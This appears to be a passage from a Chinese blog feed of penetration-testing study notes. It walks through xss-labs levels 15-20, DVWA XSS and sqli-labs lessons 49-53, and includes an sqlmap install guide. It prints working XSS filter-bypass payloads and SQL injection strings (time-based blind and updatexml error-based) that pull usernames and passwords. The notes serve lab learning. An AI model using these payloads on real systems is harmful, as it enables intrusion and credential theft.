class="line-numbers-rows"><span></span></span></code></pre><p>使用了<strong>ng-include</strong>包含文件1.gif</p><p>既然这里可以包含html文件</p><p>那么也就可以<strong>包含之前有过xss漏洞的源文件</strong></p><p><code>?src='level1.php'</code></p><p>payload:</p><p><code>'level1.php?name=&lt;img src=x onerror=alert(/XSS/)&gt;'</code></p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>http://xss.com:8080/level16.php?keyword=test</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php ini_set("display_errors", 0);$str = strtolower($_GET["keyword"]);$str2=str_replace("script","&amp;nbsp;",$str);$str3=str_replace(" ","&amp;nbsp;",$str2);$str4=str_replace("/","&amp;nbsp;",$str3);$str5=str_replace("","&amp;nbsp;",$str4);echo "&lt;center&gt;".$str5."&lt;/center&gt;";?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>小写，替换<strong>script，空格，/</strong></p><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>&amp;nbsp;&amp;nbsp;"&amp;nbsp;'oonn</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>script和空格被替换为 <code>&amp;nbsp;</code>大写变成小写。</p><p>用<strong>回车替换空格来将它们分开</strong></p><p>回车：<code>%0a</code>， <code>%0d</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;img%0asrc=xss%0donmouseover=alert('xss')&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>http://192.168.31.193:8080/level17.php?arg01=a&amp;arg02=b</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;&lt;?phpini_set("display_errors", 0);echo "&lt;embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%&gt;";?&gt;&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两个输出的值都被做了实体化转义，无法闭合标签</p><p>但是问题在于本身<em><strong>embed标签</strong></em>可以加入事件，</p><p>可以<strong>在arg01,或者arg02中加入事件</strong>去触发即可</p><p>空格：<code>%20</code></p><p><code>?arg01=1%20onmouseover=alert('xss')&amp;arg02=b</code></p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>http://192.168.31.193:8080/level18.php?arg01=a&amp;arg02=b</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;&lt;?phpini_set("display_errors", 0);echo "&lt;embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%&gt;";?&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样是 <code>&lt;embed&gt;</code>标签</p><p>尝试继续在参数里加事件</p><p><code>?arg01=1%20onmouseover=alert('xss')&amp;arg02=b</code></p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><p>http://192.168.31.193:8080/level19.php?arg01=a&amp;arg02=b</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;&lt;?phpini_set("display_errors", 0);echo '&lt;embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%&gt;';?&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在源码中可知src=xsf03.swf</p><p>去xsf03.swf寻找sIFR</p><p>sIFR：当页面下载时，在一个指定的元素中用<strong>Flash</strong>渲染的文字来代替一些文本。</p><p>使用JPEXS这工具，首先定位getURL函数</p><p><strong>getURL</strong>函数，利用这个函数我们就可以自动打开指定的网页，开启条件就是链接形式</p><pre class="line-numbers language-none"><code class="language-none">sIFR.menuItems.push(new ContextMenuItem("Followlink",function() { getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget); }),new ContextMenuItem("Open link in new window",function() { getURL(sIFR.instance.primaryLink,"_blank");})); 再追踪到sIFR的内容,省略了一些代码，关键代码如下： if(_loc5_ &amp;&amp; _root.version != sIFR.VERSION) { _loc4_ = sIFR.VERSION_WARNING.split("%s").join(_root.version); } 得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL 只在内容为link时，打开，故定位以下函数： function contentIsLink() { return this.content.indexOf("&lt;a ") == 0 &amp;&amp;(this.content.indexOf("&lt;a ") ==this.content.lastIndexOf("&lt;a ") &amp;&amp;this.content.indexOf("&lt;/a&gt;") == this.content.length - 4); } //大体意思是要geturl得用a标签。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?arg01=version&amp;arg02=b</code></p><p>就是version=b</p><p>a标签构造链接</p><p><code>?arg01=version&amp;arg02=&lt;a%20href="javascript:alert(%27xss%27)"&gt;111&lt;/a&gt;</code></p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><p>http://192.168.31.193:8080/level20.php?arg01=a&amp;arg02=b</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level20&lt;/h1&gt;&lt;?phpini_set("display_errors", 0);echo '&lt;embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%&gt;';?&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?arg01=id&amp;arg02=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)*//&amp;width&amp;height*</code></p><p>没有弄出来。</p><p>结束…</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/javascript-cao-zuo-cookie/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/javascript-cao-zuo-cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="客户端读取cookie"><a href="#客户端读取cookie" class="headerlink" title="客户端读取cookie"></a>客户端读取cookie</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="客户端设置cookie"><a href="#客户端设置cookie" class="headerlink" title="客户端设置cookie"></a>客户端设置cookie</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token string">"username=wuya"</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h1><p> 新建一个同名的cookie，<strong>覆盖</strong>原来的cookie（属性必需一致） </p><h1 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h1><p>把<strong>过期时间</strong>设置为比当前时间早的时间 </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/dvwa-xss-ba-chang/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/dvwa-xss-ba-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Midum"><a href="#Midum" class="headerlink" title="Midum"></a>Midum</h2><p><strong>大小写</strong>或者<strong>双写</strong>绕过 </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>s<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>cript<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>其他标签绕过 </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> οnerrοr<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>使用**htmlspecialchars()**函数，把相应字符转换为 <strong>实体字符</strong> </p><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Midum-1"><a href="#Midum-1" class="headerlink" title="Midum"></a>Midum</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>Script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><pre class="line-numbers language-none"><code class="language-none">&lt;img src=1 οnerrοr=alert(/XSS/)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><p> 使用htmlspecialchars函数，把相应字符转换为实体字符</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLmap安装教程</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqlmap-an-zhuang-jiao-cheng/sqlmap-an-zhuang-jiao-cheng/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqlmap-an-zhuang-jiao-cheng/sqlmap-an-zhuang-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1>SQLmap安装教程</h1><h2>sqlmap简介：</h2><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MS-SQL,,MYSQL,ORACLE和POSTGRESQL。SQLMAP采用四种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。</p><h2>准备工作：</h2><p>(1) Python2.7.11；</p><p><a href="https://www.python.org/" target="_blank">https://www.python.org/</a></p><p>(2) SQLMap</p><p><a href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/4a026f364a47475ebdb55615256e8de9.png" alt="image.png" class="align-none"></p><p>默认全选，下一步</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/07923b5ef4144f02aa16bb4d7b8f0c4b.png" alt="image.png" class="align-none"></p><p>更改安装路径即可</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/449d3cb7f5bd4cc895d1ba721f90d633.png" alt="image.png" class="align-none"></p><p>下载sqlmap：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/b09c468d9ba34ad8956773775d54a439.png" alt="image.png" class="align-none"></p><p>下载完成，进行解压文件，推荐除C盘以外其他盘符</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/7b3424a4c54144a6b6b69f578d9dbba3.png" alt="image.png" class="align-none"></p><p>再安装路径下，输入cmd</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/494d793ab27f44f5a9c46a335cab347b.png" alt="image.png" class="align-none"></p><p>启动cmd，输入sqlmap.py 检测是否运行成功！</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/8728087c256b4cf9848fd4dfc4c0d0fb.png" alt="image.png" class="align-none"></p><p>对应工具包网盘地址：</p><p>链接：<a href="https://pan.baidu.com/s/1yC8P6a_5KI5B_JT7uyVHTw" target="_blank">https://pan.baidu.com/s/1yC8P6a_5KI5B_JT7uyVHTw</a><br>提取码：0xkf</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less53</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less53/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less53/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是时间盲注  ，字符型，闭合方式单引号’ <a name="acRqZ"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length(database())=8,sleep(3),0)--+猜解数据库名称 ?sort=1'</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)--+猜解数据表名称?sort=1'</span> and if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'))=20,sleep(3),0)#猜解字段名称?sort=1'</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(mid((select group_concat(username,0x7e,password) from users),1,1)='</span>D',sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less52</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less52/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less52/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users ORDER BY <span class="token variable">$id</span>"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有报错回显，还是时间盲注  ，数字型</p><p><a name="ukBAB"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">8</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据库名称 ?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">29</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">20</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment">#</span>猜解字段名称?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'D'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less51</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less51/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less51/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此关与Less50的区别为闭合方式为单引号，字符型注入，同样存在堆叠注入</p><p><a name="GxiDU"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表?sort=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1) -- +爆破字段?sort=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less49</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less49/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less49/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此关的闭合方式为单引号’，还是需要时间盲注去猜解数据\ <a name="qjWYr"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?sort=1'</code> <a name="ukBAB"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length(database())=8,sleep(3),0)--+猜解数据库名称 ?sort=1'</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)--+猜解数据表名称?sort=1'</span> and if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span 